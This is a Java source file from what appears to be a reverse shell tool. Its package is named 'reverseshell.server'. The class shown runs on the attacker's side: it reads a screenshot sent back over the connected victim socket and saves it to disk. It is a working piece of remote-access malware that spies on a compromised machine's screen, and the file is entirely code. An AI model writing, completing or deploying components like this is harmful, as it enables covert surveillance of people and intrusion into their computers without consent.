package obs1d1anc1ph3r.reverseshell.server;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.net.Socket;
import javax.imageio.ImageIO;

public class ReceiveScreenShot {

    public void receiveScreenshot() {
        try {
            ReverseShellServer server = new ReverseShellServer();
            Socket clientSocket = server.getClientSocket();
            DataInputStream dataIn = new DataInputStream(clientSocket.getInputStream());

            int fileSize = dataIn.readInt();
            byte[] imageBytes = new byte[fileSize];
            dataIn.readFully(imageBytes);

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
            BufferedImage image = ImageIO.read(byteArrayInputStream);

            File outputFile = new File("screenshot.png");
            ImageIO.write(image, "png", outputFile);
            System.out.println("[*] Screenshot received and saved as " + outputFile.getAbsolutePath());
        } catch (IOException e) {
            System.err.println("[ERROR] Failed to receive screenshot: " + e.getMessage());
        }
    }

}
